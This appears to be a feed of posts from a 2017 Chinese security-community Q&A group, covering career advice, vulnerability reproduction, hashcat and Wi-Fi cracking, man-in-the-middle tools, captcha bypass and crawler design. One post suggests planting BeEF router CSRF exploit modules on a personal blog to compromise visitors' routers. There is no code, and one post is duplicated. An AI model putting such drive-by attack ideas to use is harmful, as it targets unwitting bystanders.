<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 默认下载的是做好的vmware的虚拟机

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 咦~我也去下一个玩玩hh 还以为挺复杂的

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 嗯。。我是小白

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: Nice

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 嗯哼

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 搞错了

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 。。。

<img src="https://file.xiaomiquan.com/69/06/6906ae93875b4c665752597faa63093862c424e4ddd841064d7ca6327827f840.jpg" width="25px"/> __Ю° ゜• .__: 以前试了好多次网上的步骤，就是没成功，真的nice

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/69/06/6906ae93875b4c665752597faa63093862c424e4ddd841064d7ca6327827f840.jpg" width="25px"/> __Ю° ゜• .__: 嗯呐，有帮助就好

<img src="https://file.xiaomiquan.com/69/06/6906ae93875b4c665752597faa63093862c424e4ddd841064d7ca6327827f840.jpg" width="25px"/> __Ю° ゜• .__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 感谢分享


...

---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-11:

> ENegatiVY 提问：
web安全和渗透测试的区别在哪里？感觉渗透测试包括了通过web进行渗透。暑假要去实习，但是不知道怎么在这两个里面选。个人更倾向于渗透，但是不知自己的理解对不对


我们那份技能树里，你看看渗透测试，就知道Web安全只是它的一个子集。

其实大多数公司的渗透测试都太浅，有的只能称为：扫描器工程师，因为这类人基本只会用扫描器。



...

<img src="https://file.xiaomiquan.com/e6/70/e670fb59afbe868055fa52141b08b901837c983d5b9123e6ac53b9cff331dd65.jpg" width="25px"/> __残风逝雪丶__: 个人理解web安全测试是发生在产品上线之前，渗透测试是上线之后。安全测试更倾向于找一些比较明显的漏洞，比如注入跨站等。而渗透测试则是“不择手段”的寻找系统的弱点目的比较明确。这也是为什么现在很多网站你直接丢到工具里面跑什么都跑不出来的原因(在上线之前不知道被多少工具跑过多少遍了)。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-11:

> 曹斌 提问：
您好，请问关于go语言安全编程，有哪些方面可以研究 或者有什么材料可以分享吗？谢谢！


安全技能树里有提到 GO 的官方入门资料，很清晰，然后再看你想怎么做，再查资料去吧，这方面的资料确实不多。



---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-10:

> 匿名用户 提问：
iPhone保持不越狱，及时更新，同时不让其他人碰到，既然生活离不开手机，如何保护好自己手机上的隐私安全？


已经很安全，如果还中招你就遇到百万价值的0day，或者无力抵抗的黑灰产业。

在密码方面 1Password 值得用，云服务谨慎用，陌生 Wi-Fi 更需谨慎。



...

<img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__: 
[隐私大爆炸，你得学几招保护自己](http://mp.weixin.qq.com/s/Kxe8OzmxCTxYjvjq3rTtlw)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-10:

> 匿名用户 提问：
你好，余弦大大我是今年刚毕业的，一直在关注很多渗透web并且自学，用的那些靶机都是php的，遇到java项目就感觉很欠缺，上传一句话都不知道传啥，没有那种一通则通的感觉，自学了php和python我是不是要把java学一遍，还是有针对java这方面的训练。


Java 很重要，不仅不少重大漏洞和这有关，还有安卓上也是 Java。

建议把历史上所有 Struts 2 的漏洞及 Java 那些反序列化漏洞都复现一遍，自己安装漏洞环境，看那些公开的分析资料，自己复现，会有很大收获。



---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-09:

> 剑思庭 提问：
如何看待工控安全这个行业？


没出事时，这个窄圈子自己热闹，出事了，都热闹了。

工控安全以前是不要出现场生产事故，现在是怕因为接入互联网或间接被感染导致工控网过于脆弱。这要出事确实是大事，会影响国计民生，所以重要度可以想象。

市场空间依赖工控的市场空间，安全的强需求会比其他的安全领域普遍来得高。但是，工控网有个特点，就是稳定运行优先，这导致如果没真出事，要去为了网络安全而去暂停运行，那不现实。还有，各种检测、防御方案也要求更高，第一要紧是别导致这些安全策略上了，影响工控网运转的稳定性。

所以，工控安全很迫切，但真想做好会更难。



...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 能讲下如何评估吗？


...

---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-09:

> 匿名用户 提问：
在有一定硬件支持下，想自己用服务器塔成专门跑密码的，目前只是下载了彩虹表 和其它之类跑简单密码大概1.5T，  请问一下你们在公司肯定也有专门跑密码的方案吧？  比如像 WordPress之类的密码和系统以及无线的密码？ 用什么工具以等。  能参考下或者提下意见么？


没，不过你可以试试 hashcat



...

<img src="https://file.xiaomiquan.com/fd/52/fd52795f8c90530dd8d49e20cb3ddbccc3ce8bae8e54e99b936597ba4f6c3026.jpg" width="25px"/> __hi404__: hashcat很牛逼的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:


__#姿势#__

  今天再转篇 FreeBuf 的文章《MSF外网持久控制Android手机并渗透测试局域网》：


[MSF外网持久控制Android手机并渗透测试局域网 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/sectool/136574.html)



这个大三学生动手能力不错，哪家相关安全公司需要，可以考虑收了。

年轻人应该多折腾，守正出奇。把握好度就行，一定要把握好度，否则，违法犯罪你迟早跑不掉。

BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。



...

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 想我大三的时候还在光着屁股玩泥巴呢

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 我也看了，感觉好像有办法实验一次，不过有很多点疑问，试试再来请教可好，现在就有个问题，我用dns欺骗在家里能骗局域网内一台机（共8台只能骗一台），在办公室一台都骗不了，一执行还把人弄死你了，大侠请赐教

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 你怎么做dns欺骗的？

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 说到守正出奇，今晚突然想起之前看过的一个贴，tieba.baidu.com/p/4963716287?see_lz=1&pn=1  这位大兄弟的SE也是六到没谁了

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 社工的实例

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 感觉输在了起跑线上。。。 😖

<img src="https://file.xiaomiquan.com/36/27/3627128908f9e2da0298fefe94350d8186d407f6110aa9c3a0ba06f4c33254f6.jpg" width="25px"/> __　__: 文中提到自己是大三狗😁

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: kali下用ettercap,,扫描主机经常扫不全，中间人经常无效……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比看看 bettercap

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 所以啊有高手快速指导反馈才能进步，半年前就这个问题折腾的半死，最后都停止玩了，两台电脑一台没问题，一台win10下虚拟机能nat联网，可是不能桥接，网上都查遍了也没解决

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比结果可以再反馈下

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这种远程问就是很难弄明白，各种小问题非常繁琐，每一个小坑都要折腾半死，烦的自己都不好意思一直问

<img src="https://file.xiaomiquan.com/e6/16/e616b63d215ace23913e168c6b8d4f4b20eeab9eb71886ecabb3bd60cd4f07fe.jpg" width="25px"/> __萝卜__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: ettercap跟bettercap都试过 感觉都是时灵时不灵 cos哥有没有更稳定的中间人工具推荐？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:

> 匿名用户 提问：
因为本身搞运维的，自然而然先考虑安全运维，但是在拉勾上看了下需求并不多。您能说下安全运维这个情况吗？


可以认为就是在运维基础上加上安全习惯、操作罢了。顺便说下运维牛的人玩起安全其实很6的，比如各大系统、网络如出入无人之境。



...

<img src="https://file.xiaomiquan.com/87/b2/87b217dbd34242e97b5f6a7a29bcc77846a20a135c5f3f4202ef559f56cfd0c3.jpg" width="25px"/> __刘二和__: 运维和安全学的都挺杂，需要掌握的知识有不少交集


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:

> 匿名用户 提问：
你好，能不能分享一些关于边界设备安全的资料，例如路由器，防火墙这类设备的安全，以及如何基于这类设备进行渗透测试，谢谢


之前分享的知道创宇研发技能表里有列不少。渗透测试高姿势可以参考 NSA 方程式被泄露的那批防火墙 Exploits。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:

> 匿名用户 提问：
请问cos，用破解WIFI最高效的还是用彩虹表吗？另外如何防范彩虹表破解？


得看情况，如果是 WPA2 且无一键 WPS 这个缺陷情况下，是彩虹表。密码12位，再加几个特殊字符，很难很难破了。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:


__#姿势#__

  今天看到这篇文章《论如何反击用AWVS的黑客》：


[论如何反击用AWVS的黑客 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/news/136476.html)



思路是经典的，本质是 AWVS 内置的浏览器解析引擎会执行我们自定义好的 JavaScript。然后大家可以再看看 BeEF 里的路由器攻击插件集：

beef/modules/exploits/router/

这里有一堆路由器的 CSRF 利用插件。

如果你在自己的页面（比如自己的博客）挂上这些插件利用，哪天有人不小心访问你的页面，那么他们用的路由器就可能被 CSRF 利用，然后中招，比如有命令执行的，可以反弹出 MSF 利用。

去年我办的 TOBEAHACKER 培训，我分享了一个国产路由器 0day 利用，也是此道理。未来会考虑公布完整的挖掘与分析利用全过程。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 本圈特别补上 BeEF 里路由器攻击插件集合的链接：
[beef/modules/exploits/router at master · beefproje...](https://github.com/beefproject/beef/tree/master/modules/exploits/router)



<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 期待

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 期待

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: Beef果然神

<img src="https://file.xiaomiquan.com/e5/0b/e50b551826e5c9b4ab83562e964e8274367bd6f36f2cb8c010dc75017bf17c14.jpg" width="25px"/> __蛮吉__: 真是干货满满

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 消化中。。。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:


__#资源#__

  全球知名 CTF 历届 write-ups 
[GitHub - ctfs/write-ups-2017: Wiki-like CTF write-...](https://github.com/ctfs/write-ups-2017)

 

喜欢玩 CTF 的，可以看看。



...

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 大家也可以关注一下ctftime，最新的writeup都会及时推送。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 嗯 这个也很好 权威


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-08:

> GeekaLeo 提问：
极验验证有没有什么巧妙的思路拿下？（传统思路：搜集人拖动鼠标特征的大量数据，提炼特征，也可结合机器学习使其更为精准）


大家一起来探讨吧🤕



...

<img src="https://file.xiaomiquan.com/e0/75/e075c362ac74f09676dbd060c22739fca3e171d53df0d04d82a079581b134231.jpg" width="25px"/> __Q__: 那机器根据这些大量数据，学习模仿一下，不就不管用了吗？并不了解机器学习的路过～

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: 大学狗一枚 暑假准备写的项目也是和验证码有关的 刚看了看极验验证的验证码 第一代的字符验证码我想拿下的方法应该都是比较成熟的 二值化 去噪 处理字符 匹配字符 第二代滑动验证的话我觉得是现在较为普遍的 看直播的时候经常看到 对于这个的拿下 我是这样子想得 细心观察你会发现滑块要拖动到的位置 形状与滑块相同 更重要的是颜色明显是比背景图片的颜色要深沉的 这样的话可以利用这个特点读取滑动验证码图片(这里的图片是模拟鼠标点击之后出现要拖动的图片) 分析里面的像素(玩过ctf隐写里面就有个LSB 这里的话也要用类似的手段分析像素) 找到像素颜色深度明显不一样的地方 而且这个滑动验证并不是要你百分百位置正确 有误差也是可以通过的 这点也可以利用 对于第三代的点击行为验证码 暂时没有思路 我看一下相关文档看看有没有什么好点子

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: 如果你动动手就好了，你就会卡在拖动轨迹上，拖动轨迹的解决方法大致是我问题里说的那样。你这也是传统思路～


...

---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-08:


__#公告#__

  如果有些问题超过一天我们没回答的，可能是我们觉得这类问题不适合公开讨论或过于泛或已经回答过类似的或超出我们能力范围。那么，大家可以私信问我们。

私信给我、余弦都行，我们会尽量互动，希望对你有帮助。

补充：问问题之前可以先搜索引擎自己搜索下，然后小密圈顶部有个“搜索”功能，看看我们是否回答或分享过。谢谢。



---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-08:

> Lion💬💬💬 提问：
做计算机终端安全检查时，怎么检查一台终端是否共享过热点？(PS:不是连接过的WIFI，是查是否有过共享热点事件）


好问题，这个估计玩取证的人更懂得，因为这些动作应该会在终端系统上留下痕迹。

我们没试过，但给你一个建议：比如 Windows 下，你用 Process Monitor 来监控下你自己的共享过程，看看是否会在注册表或什么位置留下信息。



...

<img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__: 每个版本系统都设置热点，找个记录注册表更改的工具记录下就有特征了…可以依据特征写个检查脚本了


...

---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-08:

> 匿名用户 提问：
您好，计算机小白一只，由于非计算机专业，大学期间只学过C语言，请问怎样才能逐渐看懂圈子里发的东西？或者说，最初阶段应该看些什么和干什么？谢谢


不懂的词多百度/Google



---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-08:

> 匿名用户 提问：
有一些账号密码，或者一些关键的信息。以前一直都是用的txt或者word保存，学习过sql sever。用什么保存这类文件，是数据库还是用其他的工具呢？若是数据库选择什么数据库比较合适且以后学习安全也适合的。希望解答~


1Password



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-08:

听到一个很深的培训套路：保证你就业，但是就业是什么公司这点就很被动了，入职后不久就被开除，也许也是他们“利益集团”计划内的事。

最终还得自己强，否则玩不过这些老江湖，但自己强的人比例实在太小。



...

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 期待大大们即将开展的培训😍

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 话说培训这个事不好搞，如果我们没十足让参与者收获满满的准备，宁愿不搞。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 如果有参与了这类培训，但是发现一些肮脏交易，欢迎给我们反馈，别让一些垃圾污染了这个行业。

<img src="https://file.xiaomiquan.com/c0/c0/c0c08efbac9f7841a0b0e34210cb18f0b6f5e0edcf5dcf3b5e00492c95406fd6.jpg" width="25px"/> __八分熟__: 保证就业我想就是给大家一个心理安慰，就业是一种生存方式，但如果真得喜欢，其更偏重得还是内容，就业可能就是短期目标。

<img src="https://file.xiaomiquan.com/c8/4d/c84d3b3fb2f71423e6a315e509f1918fe8d921e54c95e219cdb75c4083ed3acb.jpg" width="25px"/> __Loong__: 关于培训，有没可能基于已发生过的实际案例，构建当时的环境，重现一遍过程，类似围棋复盘。这样线上也可参与😂


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-08:

听到一个很深的培训套路：保证你就业，但是就业是什么公司这点就很被动了，入职后不久就被开除，也许也是他们“利益集团”计划内的事。

最终还得自己强，否则玩不过这些老江湖，但自己强的人比例实在太小。



...

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 期待大大们即将开展的培训😍

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 话说培训这个事不好搞，如果我们没十足让参与者收获满满的准备，宁愿不搞。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 如果有参与了这类培训，但是发现一些肮脏交易，欢迎给我们反馈，别让一些垃圾污染了这个行业。

<img src="https://file.xiaomiquan.com/c0/c0/c0c08efbac9f7841a0b0e34210cb18f0b6f5e0edcf5dcf3b5e00492c95406fd6.jpg" width="25px"/> __八分熟__: 保证就业我想就是给大家一个心理安慰，就业是一种生存方式，但如果真得喜欢，其更偏重得还是内容，就业可能就是短期目标。

<img src="https://file.xiaomiquan.com/c8/4d/c84d3b3fb2f71423e6a315e509f1918fe8d921e54c95e219cdb75c4083ed3acb.jpg" width="25px"/> __Loong__: 关于培训，有没可能基于已发生过的实际案例，构建当时的环境，重现一遍过程，类似围棋复盘。这样线上也可参与😂


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-08:

> 国勇@ATToT 提问：
余大大，你是怎么学习和实践安全知识，我们能组建一个虚拟团队吗？一起实践！


我有不少环境、机器来辅助加速我各方面技能实战，也许未来会细细分享我的方式，但我还觉得不够。

团队也很关键，好的团队不仅业务能做漂亮，还能有个很好的学习互相促进的环境氛围。

至于虚拟团队，得看你能做什么？也许可以加入我们这支虚拟的 LanT34m。



...

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 谢谢你的回答！期待看到你的学习方法分享。

我是一名程序员，主要专注 node,python. 安全这块看过较多资料与书籍，实践过一些方法，希望加入你的虚拟团队！

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 看错了，以为你要做虚拟化安全。。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-08:

> 匿名用户 提问：
请问 在安全相关的公司工作平时都会干些什么呢，比如web安全，不会总是在挖漏洞吧？


得看你从事具体什么岗位，比如 Web 安全，是做漏洞研究，还是相关安全产品研发。如果是漏洞研究，那每天主要任务就是漏洞分析、挖掘、PoC/Exp 编写，漏洞爆发了赶紧第一时间应急出上诉内容。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> Coco413@ATToT 提问：
请问cos一个好的爬虫除了具备分布式，去重，ajax ，登录扫描等，还应该具备哪些？还有个问题就是登录扫描的cookie 有效性改如何维持


如：
字符集编码
HTML/XML不规范
链接伪协议及不规范
各种文件类型
网页跳转：服务端、客户端（Meta、JavaScript、Flash等）
Cookie/认证会话维护
代理维护
GPC(Cookie/Post/Get)参数提取
HTTP多种请求
超时：连接超时/读取超时
JavaScript动态出来的链接
AJAX请求
链接爬取去重算法
广度深度算法
并发：进程/线程/协程
调度：同步/异步
各种内存优化
各种异常维护
灵活配置
灵活扩展
优秀的文档...

Cookie 这个维护，本质原理：看浏览器怎么做的，尽量去模拟之。很多场景可以通过把过期时间设置为很久以后，但这个得看目标场景，差异不小。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 以上文字来自我以前的这篇文章：

[写爬虫很简单但也很难(附某美女站爬虫源码)](http://mp.weixin.qq.com/s/yRsH0mgcWkqQwJcCL9VnmA)



<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 感谢，我的场景是个漏扫，我现在做法是后台一直带这个cookie 访问并保存最新cookie 让他一直有效，我漏扫需要对应那个站时候再取对应的cookie ，但感觉不够高效。。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 在复杂业务场景下，Cookie 维护是很复杂的事，不一定最新 Cookie 就最有效，这个很头疼，不那么讲究的话，不一定非追求极致。

你感觉不高效的点是什么？

